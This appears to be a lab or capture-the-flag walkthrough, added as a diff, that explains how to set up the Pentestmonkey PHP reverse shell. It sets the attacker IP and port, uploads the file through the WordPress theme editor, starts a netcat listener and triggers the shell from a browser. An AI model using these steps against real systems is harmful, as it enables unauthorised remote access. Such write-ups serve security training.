@@ -1,0 +1,31 @@
+This screenshot shows the reverse.php file opened in nano, which contains a PHP reverse shell script sourced from Pentestmonkey.
+
+Purpose:
+
+This script allows for a remote shell connection by initiating a callback to the attacker's machine.
+
+The attacker sets their own IP and port in this file (further down in the script), allowing the reverse connection.
+
+Steps:
+
+Open reverse.php using a text editor like nano.
+
+Replace the IP and port variables inside the script with your attack box details:
+
+php
+Copy
+Edit
+$ip = '10.38.1.110';  // Attacker's IP
+$port = 1234;         // Listener port
+Upload this script to a writable path on the target system (e.g., through WordPress theme editor).
+
+Set up a listener on your machine:
+
+bash
+Copy
+Edit
+nc -lvp 1234
+Trigger the reverse shell by accessing the uploaded PHP file via browser.
+
+Takeaway:
+The use of well-known reverse shell scripts (like this one) is a reliable way to gain remote access once file upload or code execution is achieved.
